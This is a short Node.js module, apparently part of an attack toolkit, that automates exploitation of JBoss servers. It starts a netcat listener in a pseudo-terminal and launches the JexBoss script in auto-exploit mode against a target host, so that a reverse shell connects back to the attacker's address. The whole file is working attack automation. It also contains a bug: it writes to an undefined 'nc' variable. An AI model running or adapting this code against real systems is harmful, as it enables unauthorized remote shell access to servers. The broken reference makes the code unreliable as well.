
const { spawn } = require('child_process');

var os = require('os');
var pty = require('node-pty');
 
var shell = os.platform() === 'win32' ? 'powershell.exe' : 'bash';
 


module.exports = function(host,reverseHost,callback) {
    console.log( ['-vv', '-l', reverseHost.split(':')[1]])

    var ptyProcess = pty.spawn(shell, [], {
        name: 'xterm-color',
        cols: 80,
        rows: 30,
        cwd: process.env.HOME,
        env: process.env
      });
       

      ptyProcess.write(`nc -vv -l ${reverseHost.split(':')[1]}\r`);




    const jexboss = spawn('python', ['./exploit/jexboss/jexboss.py', '--auto-exploit', '-host', host,
        '--reverse-host', reverseHost]);

    jexboss.stdout.on('data', (data) => {
        console.log(`jexboss stdout: ${data}`);
        if (data.indexOf('Type [ENTER] to continue...') > -1) {
            nc.stdin.write('\n');
        }
    });

    jexboss.stderr.on('data', (data) => {
        console.log(`jexboss stderr: ${data}`);
    });

    jexboss.on('close', (code) => {
        console.log(`jexboss child process exited with code ${code}`);
    });

    callback(ptyProcess);
}